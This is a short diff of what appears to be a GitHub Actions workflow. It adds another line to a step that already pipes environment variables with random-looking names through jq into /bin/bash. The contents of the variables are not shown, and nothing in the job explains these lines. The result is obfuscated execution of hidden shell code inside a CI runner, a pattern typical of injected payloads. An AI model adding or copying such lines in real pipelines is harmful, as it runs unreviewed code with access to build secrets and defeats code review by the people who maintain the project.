@@ -29,6 +29,7 @@ jobs:
           echo $fqqjs0 | jq -r .uvnex22463 | /bin/bash
           printf '%s' "$b692" | jq -r .ysyht7225 | /bin/bash
           echo $epcya467 | jq -r .bp153 | /bin/bash
+          echo $y6962 | jq -r .qsw30295 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
